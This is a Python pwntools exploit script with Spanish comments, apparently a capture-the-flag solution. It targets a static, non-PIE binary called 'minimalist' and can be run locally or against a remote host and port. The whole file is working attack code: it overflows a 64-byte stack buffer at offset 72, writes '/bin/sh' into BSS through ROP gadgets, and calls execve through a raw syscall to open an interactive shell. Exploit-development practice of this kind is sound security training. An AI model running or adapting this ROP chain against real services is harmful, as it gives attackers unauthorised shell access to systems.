#!/usr/bin/env python3
"""
ROP chain usando syscalls directas para execve("/bin/sh", NULL, NULL).

El binario es estático — muchos gadgets disponibles de glibc compilada.

syscall(execve):
  rax = 59  (SYS_execve)
  rdi = addr de "/bin/sh"
  rsi = 0   (argv = NULL)
  rdx = 0   (envp = NULL)
  syscall

Estrategia:
  1. Escribir "/bin/sh" en BSS (dirección fija con PIE=off)
  2. Configurar rax=59, rdi=&bss, rsi=0, rdx=0
  3. syscall

Uso:
  python3 solve.py              # local
  python3 solve.py REMOTE <ip> <port>
"""
import sys
from pwn import *

BINARY = './minimalist'
elf = ELF(BINARY, checksec=False)
rop = ROP(elf)

OFFSET = 72  # 64-byte buffer + 8 saved rbp

# Buscar gadgets en el binario estático
# (un binario estático con glibc tiene miles de gadgets)
try:
    POP_RAX = rop.find_gadget(['pop rax', 'ret'])[0]
    POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
    POP_RSI = rop.find_gadget(['pop rsi', 'ret'])[0]
    POP_RDX = rop.find_gadget(['pop rdx', 'ret'])[0]
    SYSCALL  = rop.find_gadget(['syscall', 'ret'])[0]
    # Gadget para escribir en memoria: mov [rdi], rax; ret
    MOV_PTR_RDI_RAX = rop.find_gadget(['mov qword ptr [rdi], rax', 'ret'])[0]
except Exception as e:
    print(f'[!] Error buscando gadgets: {e}')
    print('[*] Usa: ROPgadget --binary minimalist | grep -E "pop rax|pop rdi|pop rsi|pop rdx|syscall|mov.*rdi.*rax"')
    sys.exit(1)

# Sección BSS — dirección fija (PIE=off) para escribir "/bin/sh"
BSS_ADDR = elf.bss(0x100)

print(f'[*] pop rax @ {hex(POP_RAX)}')
print(f'[*] pop rdi @ {hex(POP_RDI)}')
print(f'[*] pop rsi @ {hex(POP_RSI)}')
print(f'[*] pop rdx @ {hex(POP_RDX)}')
print(f'[*] syscall @ {hex(SYSCALL)}')
print(f'[*] BSS addr: {hex(BSS_ADDR)}')

if args.REMOTE:
    p = remote(sys.argv[2], int(sys.argv[3]))
else:
    p = process(BINARY)

# Construir ROP chain
chain  = b'A' * OFFSET

# Paso 1: escribir "/bin/sh\x00" en BSS
chain += p64(POP_RAX) + b'/bin/sh\x00'   # rax = "/bin/sh\x00" (8 bytes)
chain += p64(POP_RDI) + p64(BSS_ADDR)    # rdi = &bss
chain += p64(MOV_PTR_RDI_RAX)             # [bss] = "/bin/sh\x00"

# Paso 2: execve("/bin/sh", NULL, NULL)
chain += p64(POP_RAX) + p64(59)           # rax = SYS_execve (59)
chain += p64(POP_RDI) + p64(BSS_ADDR)    # rdi = &"/bin/sh"
chain += p64(POP_RSI) + p64(0)            # rsi = NULL
chain += p64(POP_RDX) + p64(0)            # rdx = NULL
chain += p64(SYSCALL)                      # syscall!

p.recvuntil(b'Input:\n')
p.send(chain)
p.interactive()
